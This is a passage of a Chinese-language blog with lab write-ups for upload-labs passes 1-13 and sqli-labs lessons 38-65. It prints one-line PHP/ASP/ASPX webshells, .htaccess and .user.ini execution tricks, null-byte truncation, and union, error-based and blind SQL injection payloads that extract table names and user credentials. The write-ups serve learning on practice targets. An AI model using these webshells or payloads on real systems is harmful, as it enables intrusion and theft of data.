<li><strong>上传漏洞类型大体可分为以下几类：</strong></li>
</ul>
<p><img src="/.com//1.png" alt="1"></p>
<ul>
<li><p>判断上传漏洞类型的思路：<img src="/.com//2.png" alt="2" style="zoom: 200%;"></p>
</li>
<li><p><strong>webshell（一句话木马）的制备</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>@</code>表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;password&#39;]</code>表示从页面中用post的方式获得password这个参数值。</p>
</li>
</ul>
<p>那么这句话的作用是什么呢？举个例子：password=echo ‘a’，就相当于&lt; ?php @eval(“echo ‘a’”);? &gt;即再网页上输出一个a。我们知道了这个就可以根据改变password的值来达到操控服务器的目的了，或者我们可以连接蚁剑，一键获取目标服务器。</p>
<p><strong>补充：</strong></p>
<ul>
<li><strong>入侵的条件</strong></li>
</ul>
<p>（1）木马上传成功，未被杀；<br>（2）知道木马的路径在哪；<br>（3）上传的木马能正常运行。</p>
<ul>
<li><p><strong>常见的一句话木马</strong></p>
<p>php的一句话木马： &lt; ?php @eval($_POST[‘pass’]);? &gt;<br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
</li>
</ul>
<h1 id="pass-01：js检查"><a href="#pass-01：js检查" class="headerlink" title="pass-01：js检查"></a>pass-01：js检查</h1><p>打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查，</p>
<p><img src="/.com//3.png" alt="3"></p>
<p>而且设置了上传白名单，<img src="/.com//4.png" alt="4"></p>
<p>因此题目要求我们上传一个webshell到服务器上，我们可以有以下三种思路：</p>
<ol>
<li>删除那段有关js检查的代码</li>
<li>增加白名单中可上传文件类型</li>
<li>先将上传文件类型改为白名单的一种（使其通过js检查）然后用burp抓包，再将其文件后缀更改为预期文件类型</li>
</ol>
<h1 id="pass-02：MIME绕过"><a href="#pass-02：MIME绕过" class="headerlink" title="pass-02：MIME绕过"></a>pass-02：MIME绕过</h1><ul>
<li>查看提示：本pass在服务端对数据包的<strong>MIME</strong>进行检查。</li>
</ul>
<p><strong>MIME：</strong>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。</p>
<p><strong>常见的MIME类型：</strong></p>
<p>udio/mpeg -&gt; .mp3<br>application/msword -&gt; .doc<br>application/octet-stream -&gt; .exe<br>application/pdf -&gt; .pdf<br>application/x-javascript -&gt; .js<br>application/x-rar -&gt; .rar<br>application/zip -&gt; .zip<br>image/gif -&gt; .gif<br>image/jpeg -&gt; .jpg / .jpeg<br>image/png -&gt; .png<br>text/plain -&gt; .txt<br>text/html -&gt; .html<br>video/mp4 -&gt; .mp4</p>
<ul>
<li><strong>查看源码：</strong><img src="/.com//5.png" alt="5"></li>
</ul>
<p>也就是说服务器还是规定了白名单，那么我们可以有以下两种思路：</p>
<p>1.先将webshell后缀类型改为允许上传的文件后缀类型（使其绕过MIME检查），然后burp抓包，将webshell后缀改回.php。</p>
<p>2.将webshell.php文件上传，burp抓包，将Content-Type的MIME类型改为白名单中的类型。</p>
<ul>
<li><strong>sp：</strong>我在看源码的时候发现这关的源码也存在js检查的源码，但是我发现把这段码删了并不能实现上传webshell，因为源码中没有规定checkfile()的作用，而且服务器是通过if语句判断上传文件类型是否符合。</li>
</ul>
<h1 id="pass-03：上传特殊可解析后缀"><a href="#pass-03：上传特殊可解析后缀" class="headerlink" title="pass-03：上传特殊可解析后缀"></a>pass-03：上传特殊可解析后缀</h1><ul>
<li>查看源码：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到服务器对上传文件做了很多过滤处理，包括设定了黑名单。</p>
<ul>
<li>这边我们补充一个知识点：Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置（AddType application/x-httpd-php .php .php3 .phtml），规定哪些文件后缀是以php格式来解析的。</li>
</ul>
<p>​      我们看到黑名单中没有禁用这些可解析后缀，因此我们可以利用这一点，上传可解析后缀。</p>
<ul>
<li><p>sp：常用可解析后缀<img src="/.com//6.png" alt="6"></p>
</li>
<li><p>陌生函数：</p>
</li>
</ul>
<p>！strrchr() 函数</p>
<p>功能：查找字符，在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。</p>
<p>语法：strrchr(string，char)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td>char</td>
<td>必需。规定要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符。</td>
</tr>
</tbody></table>
<p>！trim()函数</p>
<p>功能：除去<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2/1017763">字符串</a>开头和末尾的空格或其他字符。</p>
<p>语法：trim (string $str [,string $charlist ])</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定要检查的字符串。</td>
</tr>
<tr>
<td><em>charlist</em></td>
<td>可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\0” - NULL ；”\t” - 制表符； “\n” - 换行； “\x0B” - 垂直制表符； “\r” - 回车 ；” “ - 空格</td>
</tr>
</tbody></table>
<p>！in_array()函数</p>
<p>功能：搜索数组中是否存在指定的值。</p>
<p>语法：in_array(search,array,type)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>search</em></td>
<td>必需。规定要在数组搜索的值。</td>
</tr>
<tr>
<td><em>array</em></td>
<td>必需。规定要搜索的数组。</td>
</tr>
<tr>
<td><em>type</em></td>
<td>可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</td>
</tr>
</tbody></table>
<p>！move_uploaded_file() 函数</p>
<p>功能：将上传的文件移动到新位置。</p>
<p>语法：move_uploaded_file(file,newloc)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>file</td>
<td>必需。规定要移动的文件。</td>
</tr>
<tr>
<td>newloc</td>
<td>必需。规定文件的新位置。</td>
</tr>
</tbody></table>
<ul>
<li>注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。</li>
</ul>
<p>！str_ireplace() 函数</p>
<p>功能：替换字符串中的一些字符（不区分大小写）。</p>
<p>语法：str_ireplace(find,replace,string,count)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>find</em></td>
<td>必需。规定要查找的值。</td>
</tr>
<tr>
<td><em>replace</em></td>
<td>必需。规定替换 <em>find</em> 中的值的值。</td>
</tr>
<tr>
<td><em>string</em></td>
<td>必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td><em>count</em></td>
<td>可选。一个变量，对替换数进行计数。</td>
</tr>
</tbody></table>
<h1 id="pass-04：上传-htaccess"><a href="#pass-04：上传-htaccess" class="headerlink" title="pass-04：上传.htaccess"></a>pass-04：上传.htaccess</h1><ul>
<li>这关的黑名单添加了可解析后缀，但是忽略了.htaccess类型。</li>
</ul>
<p>htaccess文件是Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能。其中.htaccess文件内容:SetHandler application/x-httpd-php设置当前目录所有文件都使用PHP解析，无论上传任何类型文件，只要文件内容符合php语言代码规范，就会被当做php文件执行。</p>
<ul>
<li>因此这关的思路是：先上传一个后缀为.htaccess，内容为：SetHandler application/x-httpd-php</li>
</ul>
<p>​           &lt;FilesMatch “webshell.jpg”&gt;                   </p>
<p>或　　                 SetHandler application/x-httpd-php         的文件，然后再上传webshell.jpg即可。</p>
<p>​            </p>
<ul>
<li>注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。</li>
</ul>
<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><ul>
<li>pass-04是利用Apache的解析文件进行绕过黑名单，这关则是利用PHP的解析方式绕过黑名单。</li>
</ul>
<p>我们看到黑名单里又多加了一个htaccess类型，但是php配置文件类型php.ini没有被禁用，且提示告诉我们上传目录存在php文件（readme.php）。 </p>
<ul>
<li>那么这关的思路：先上传一个后缀为.user.ini（相当于用户自定义的php.ini）内容为 auto_prepend_file=webshell.png（意思是该目录下的所有php文件都包含webshell.png），然后我们再上传webshell.png，最后用蚁剑连接时我们要注意连接的是readme.php（因为其文件内容包含shell）而不是webshell.png。</li>
</ul>
<p>但是这里我其实有个疑问：那就是我们在现实渗透的时候又怎么会知道靶机的上传目录是否存在.php类型文件，以及.php文件的文件名呢？挖个坑！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
<h1 id="pass-06：后缀大小写绕过"><a href="#pass-06：后缀大小写绕过" class="headerlink" title="pass-06：后缀大小写绕过"></a>pass-06：后缀大小写绕过</h1><ul>
<li><p>这关我们查看源码发现，它的黑名单已经相当齐全了，但是它相对前几关删了一个函数：strtolower()。其作用就是把所有字符全部转为小写字母。</p>
</li>
<li><p>那么这关利用这一漏洞，上传webshell.phP文件，然后蚁剑连接即可。</p>
</li>
</ul>
<h1 id="pass-07：空格绕过"><a href="#pass-07：空格绕过" class="headerlink" title="pass-07：空格绕过"></a>pass-07：空格绕过</h1><ul>
<li><p>查看源码发现它删去了trim()函数。</p>
</li>
<li><p>这边补一个知识：在win系统下呢，如果文件后缀最后面是空格、点、：：$DATA会自动省去，也就是说在客户端目录下的是文件名是”干净”。那么我们这关的思路是：上传webshell.php文件然后抓包，在后缀后加一个空格。</p>
</li>
<li><p>那么这关的思路就是：先上传webshell.php，抓包，在后缀后加个空格</p>
<p>sp：没能复现</p>
</li>
</ul>
<h1 id="pass-08：点绕过"><a href="#pass-08：点绕过" class="headerlink" title="pass-08：点绕过"></a>pass-08：点绕过</h1><ul>
<li>查看源码发现它删去了deldot()函数。原理同pass-07</li>
</ul>
<p>那么这关的思路就是：上传webshell.php然后抓包，在后缀后加个点（.）</p>
<h1 id="pass-09：-DATA绕过"><a href="#pass-09：-DATA绕过" class="headerlink" title="pass-09：::$DATA绕过"></a>pass-09：::$DATA绕过</h1><ul>
<li>查看源码发现少了对::$DATA的过滤。</li>
</ul>
<p>DATA(NTFS文件系统的存储数据流的一个属性)NTFS文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：$DATA,当我们访问1.php::$DATA 时，就是请求 1.php 本身的数据，如果a.php 还包含了其他的数据流，比如a.php:lake2.php，请求1.php:lake2.php::$DATA，则是请求1.php中的流数据lake2.php的流数据内容。</p>
<ul>
<li>那么我们这关的思路是：先webshell.php，抓包，后缀后添加::DATA，最后蚁剑连接。</li>
</ul>
<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><ul>
<li>这关查看源码发现过滤的都过滤了，但是和以往有一点不同：上传位置表达方式改变</li>
</ul>
<p>旧：$img_path = UPLOAD_PATH.’/‘.date(“YmdHis”).rand(1000,9999).$file_ext;</p>
<p>新：$img_path = UPLOAD_PATH.’/‘.$file_name;</p>
<p>sp：没能复现</p>
<h1 id="pass-11：双后缀名绕过"><a href="#pass-11：双后缀名绕过" class="headerlink" title="pass-11：双后缀名绕过"></a>pass-11：双后缀名绕过</h1><p>我们查看源码，发现关键句：$file_name = str_ireplace($deny_ext,””, $file_name);意思是查找上传的文件名中是否存在黑名单中的值，如果存在就删去。</p>
<p>那么这关我们的思路是：上传webshell.php，抓包，后缀更改为pphphp</p>
<h1 id="pass-12：-00截断（get型）"><a href="#pass-12：-00截断（get型）" class="headerlink" title="pass-12：%00截断（get型）"></a>pass-12：%00截断（get型）</h1><p>查看这关的源码，发现上传位置表达方式改变了——$img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p>
<p>我们可以发现save_pasth是可控路径，有点像sql注入里?id=。</p>
<p>先补充知识：</p>
<p>1.php语法中，当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生。</p>
<p>2.%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它改写为十六进制0x00。</p>
<p><img src="/.com//7.png" alt="7"></p>
<p>那么这关我们的思路就是：上传webshell.png，抓包，令save_pasth=../upload/webshell.php%00</p>
<p>sp：strrpos()函数</p>
<p>功能：strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。返回字符（字符串）在目标字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。</p>
<p>语法：strrpos(string,find,start)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td><em>find</em></td>
<td>必需。规定要查找的字符。</td>
</tr>
<tr>
<td><em>start</em></td>
<td>可选。规定在何处开始搜索。</td>
</tr>
</tbody></table>
<h1 id="pass-13：0x00截断（post型）"><a href="#pass-13：0x00截断（post型）" class="headerlink" title="pass-13：0x00截断（post型）"></a>pass-13：0x00截断（post型）</h1><p>法一：同pass-12</p>
<p>法二：上传webshell.png，抓包</p>
<p><img src="/.com//8.png" alt="8"></p>
<p>加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格<img src="/.com//9.png" alt="9"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/09/upload-labs-pass1-13/" data-id="ckld8142j00040cvucb7fe0iq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-lesson54-65" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/08/lesson54-65/" class="article-date">
  <time datetime="2021-02-08T15:57:12.000Z" itemprop="datePublished">2021-02-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/08/lesson54-65/">lesson54-65</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="lesson54："><a href="#lesson54：" class="headerlink" title="lesson54："></a>lesson54：</h1><p>我们通过查看蓝字可以大致明白这关的意思：输入payload的次数小等于十次的情况下获得数据库秘钥，如果超过十次那么表名，列名还有秘钥就会重新刷新。</p>
<ul>
<li>试探注入类型：?id=1’，页面错误，但是没有回显错误信息</li>
</ul>
<p>?id=1’ and ‘1’=’1，登入成功，回显用户名和密码</p>
<p>?id=1’ and ‘1’=’2，页面错误</p>
<ul>
<li><p>因此我们可知存在sql注入点，且为单引号型。</p>
</li>
<li><p>因为我们知道了库名，我们就无需再爆库了。</p>
</li>
</ul>
<p>爆表：?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+</p>
<p>爆列：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xfih974sor ‘–+</p>
<p>爆值：?id=-1’ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sor–+</p>
<p>然后我们把得到的值输入，submit即可。</p>
<ul>
<li>最后查看源码，发现PHP对输入的key做了过滤处理，也就是说我们想从key一栏进行注入还是比较困难的。</li>
</ul>
<h1 id="lesson55："><a href="#lesson55：" class="headerlink" title="lesson55："></a>lesson55：</h1><p>同lesson54，不过注入类型改为了<code>)</code>。</p>
<h1 id="lesson56："><a href="#lesson56：" class="headerlink" title="lesson56："></a>lesson56：</h1><p>同lesson54，不过注入类型改为了<code>&#39;)</code>。</p>
<h1 id="lesson57"><a href="#lesson57" class="headerlink" title="lesson57:"></a>lesson57:</h1><p>同lesson54，不过注入类型改为了<code>&quot;</code>。</p>
<h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58:"></a>lesson58:</h1><p>执行 sql 语句后，并没有返回数据库当中的数据，所以我们这里不能使用 union 联合注入， 这里使用报错注入或者延时注入。</p>
<p><img src="/.com//1.png" alt="1"></p>
<h1 id="lesson59："><a href="#lesson59：" class="headerlink" title="lesson59："></a>lesson59：</h1><p>同lesson58，注入类型变为数字型。</p>
<h1 id="lesson60："><a href="#lesson60：" class="headerlink" title="lesson60："></a>lesson60：</h1><p>同lesson58，注入类型变为<code>&quot;)</code>。</p>
<h1 id="lesson61："><a href="#lesson61：" class="headerlink" title="lesson61："></a>lesson61：</h1><p>同lesson58，注入类型变为<code>&#39;))</code></p>
<h1 id="lesson62"><a href="#lesson62" class="headerlink" title="lesson62:"></a>lesson62:</h1><p>sql语法错误时不会回显报错，那么报错注入也没法用了，只能延时注入。</p>
<h2 id="lesson63、64、65："><a href="#lesson63、64、65：" class="headerlink" title="lesson63、64、65："></a>lesson63、64、65：</h2><p>同lesson62，仅改变注入类型。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/08/lesson54-65/" data-id="ckld8142b00000cvuec6n9hgn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-lesson46-53" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/07/lesson46-53/" class="article-date">
  <time datetime="2021-02-07T10:56:07.000Z" itemprop="datePublished">2021-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/07/lesson46-53/">lesson46-53</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="background——Order-by后的注入："><a href="#background——Order-by后的注入：" class="headerlink" title="background——Order by后的注入："></a>background——Order by后的注入：</h1><p> 查看mysql官方select的文档：</p>
<p><img src="/.com//1.jpg" alt="1"></p>
<p>由于order by 后面只能接(字段名，表达式，位置)等信息，我们并不能向原来一样使用联合查询。</p>
<p>查看lesson46的源码：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;sort&#x27;];	</span><br><span class="line">if(isset($id))</span><br><span class="line">	&#123;</span><br><span class="line">	//logging the connection parameters to a file for analysis.</span><br><span class="line">	$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">	fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">id</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<p>我们看到这关我们的输入应该是?sort=，而不再是?id=。我们输入?sort=1，即对第一列进行升序排序，且参数值要小等于列数，否则会报错（如有一个表有三列，?sort=4，页面就会报错）。</p>
<h2 id="lesson46："><a href="#lesson46：" class="headerlink" title="lesson46："></a>lesson46：</h2><p>我们查看源码可知这是数字型注入，那么我们<strong>怎么判断是否存在order by后的注入呢？</strong>我们可以通过对比输入<code>?sort=1 desc</code>和<code>?sort=1 asc</code>（desc降序，asc升序）的返回页面来判断是否存在order by后的注入——若两者返回值不同，则说明存在order by后的注入。</p>
<p>这关的payload句式有三种：</p>
<ol>
<li>?sort=(select ······)</li>
<li>?sort=1 and (select ······)</li>
<li>?sort=rand(······)</li>
</ol>
<p>注：句式(1)和(2)没有本质上的区别。</p>
<h3 id="解法一-报错注入："><a href="#解法一-报错注入：" class="headerlink" title="解法一.报错注入："></a>解法一.报错注入：</h3><h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><p>?sort=1 and updatexml(1,concat(‘~’, database()),1)</p>
<h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1)</p>
<h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’)),1)</p>
<h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select * from (select concat_ws(‘ ‘,id,username,password) from users limit 0,1) x)),1)</p>
<p>注：这边不知道为什么<code>&#39;#&#39;</code>不能用了，找了半天原因。</p>
<h2 id="解法二-布尔盲注："><a href="#解法二-布尔盲注：" class="headerlink" title="解法二.布尔盲注："></a>解法二.布尔盲注：</h2><p>SQL 像 PHP，也是一种弱类型，它会认为<code>true=1</code>，<code>false=0</code>。用在<code>order by</code>后会直接导致显示不同：</p>
<p>A:<img src="/.com//image-20210209171458273.png" alt="image-20210209171458273"></p>
<p>B:<img src="/.com//2.png" alt="2"></p>
<p>C:<img src="/.com//3.png" alt="3"></p>
<p>通过对比A,C我们可以发现，<code>order by</code>后接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是<strong>没有作用</strong>的！也就是说我们无法使用句式一、二进行布尔盲注，那么我们能不能使用句式三进行布尔盲注呢？</p>
<p>我们先输入：?sort=rand(true)<img src="/.com//4.png" alt="4"></p>
<p>再输入：?sort=rand(false)<img src="/.com//5.png" alt="5"></p>
<p>我们可以看到两种得到的返回不同，那么就说明我们可以利用句式三来进行布尔盲注。</p>
<p><strong>Q:其实这边有一个疑问，不是说order by后接的数字不起作用吗，为什么rand函数的返回值也是数字，但是却可以起作用呢？我突然有个猜想——order by后接字符、字符串或布尔值是不起作用的，也就是说数据库返回值不会根据字符串的不同而不同，如果是这样就可以理解为什么了,可是在我用时间盲注解这关的时候if函数返回值是1但是页面返回却和?sort=1的不同。我蒙了，算了，挖个坑吧！！！！！！！！！！！！！！！！！</strong></p>
<p>我们的布尔盲注思路是这样的：?sort=rand（sql语句），如果sql语句正确，那么页面的返回会和?sort=rand(true)一样（利用了rand函数的伪随机性），反之和?sort=rand(false)一样。</p>
<p><strong>sp：rand()函数是个随机函数，返回0~1间的小数。使用时也可以给定参数值（随机种子），相同的参数生成的结果也相同（伪随机性）。</strong></p>
<h3 id="爆库：-1"><a href="#爆库：-1" class="headerlink" title="爆库："></a>爆库：</h3><p>?sort=rand(left(database(),8)=’security’)<img src="/.com//6.png" alt="6"></p>
<p>我们看到页面返回与?sort=rand(true)的一样，说明数据库名就是security。</p>
<p>后续的爆表，爆列等也是这样，构造payload然后比对页面返回得结果。不多赘述。</p>
<h2 id="解法三-时间盲注："><a href="#解法三-时间盲注：" class="headerlink" title="解法三.时间盲注："></a>解法三.时间盲注：</h2><p>时间注入可以利用句式一或者句式二。在这里我们就简单的拿爆库举个例子，剩下的参考时间盲注那一关的笔记。</p>
<p>爆库：?sort=if(mid(database(),1,8)=’security’,1,sleep(5))</p>
<h2 id="lesson47："><a href="#lesson47：" class="headerlink" title="lesson47："></a>lesson47：</h2><p>和lesson46一样，注意注入类型的变化做出适当改变（包括句式的改变还有添加注释符等）即可。</p>
<h2 id="lesson48："><a href="#lesson48：" class="headerlink" title="lesson48："></a>lesson48：</h2><p>同lesson46，但是页面不再出现报错回显，故报错注入不可用。</p>
<h2 id="lesson49："><a href="#lesson49：" class="headerlink" title="lesson49："></a>lesson49：</h2><p>同lesson47，但是页面不再出现报错回显，故报错注入不可用。</p>
<h2 id="lesson50、51、52-、53："><a href="#lesson50、51、52-、53：" class="headerlink" title="lesson50、51、52 、53："></a>lesson50、51、52 、53：</h2><p>就是之前学的堆叠注入加上新学的order by后的注入，没什么新颖的，打组合拳就好了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/07/lesson46-53/" data-id="ckkxxdafe0002rgvucpre1n88" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-lesson38-45" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/06/lesson38-45/" class="article-date">
  <time datetime="2021-02-06T14:44:20.000Z" itemprop="datePublished">2021-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/06/lesson38-45/">lesson38-45</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="background——堆叠注入："><a href="#background——堆叠注入：" class="headerlink" title="background——堆叠注入："></a>background——堆叠注入：</h1><p>在 SQL 中，<code>;(分号)</code>是用来表示一条 sql 语句的结束。试想一下我们在 <code>; </code>结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。但对于不同数据库（mysql，sqlserver，oracle等）来说，除oracle不允许外，其他数据库我们可以在一条sql语句后紧接着构造下一条sql语句。</p>
